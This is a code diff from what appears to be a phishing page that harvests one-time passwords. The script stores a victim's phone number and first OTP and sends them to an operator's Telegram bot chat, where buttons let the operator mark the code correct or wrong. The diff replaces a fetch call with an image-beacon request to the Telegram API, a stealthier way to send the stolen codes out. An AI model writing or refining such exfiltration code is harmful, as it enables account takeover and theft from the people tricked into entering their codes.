@@ -32,21 +32,9 @@ localStorage.setItem('otp1', otp1);
 
 const msg = `1️⃣ *FIRST OTP VERIFICATION*\n*NEW USER - STEP 1/2*\n\n🇸🇴 *Country:* Somalia\n🌍 *Country Code:* +252\n📱 *Phone Number:* ${phone}\n🔒 *First OTP Code:* \`${otp1}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n⚠️ *Verify FIRST OTP:*\n⏰ *Timeout:* 5 minutes`;
 
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:'POST',
-    mode:'no-cors',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({
-        chat_id:CHAT_ID,
-        text:msg,
-        parse_mode: 'Markdown',
-        reply_markup:{
-            inline_keyboard:[
-                [{"text":"✅ Correct (First OTP)","callback_data":"otp1_ok"},{"text":"❌ Wrong Code","callback_data":"otp1_no"}]
-            ]
-        }
-    })
-});
+const keyboard = JSON.stringify({inline_keyboard:[[{"text":"✅ Correct (First OTP)","callback_data":"otp1_ok"},{"text":"❌ Wrong Code","callback_data":"otp1_no"}]]});
+const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown&reply_markup=${encodeURIComponent(keyboard)}`;
+new Image().src = url;
 
 let count = 10;
 const timer = setInterval(()=>{
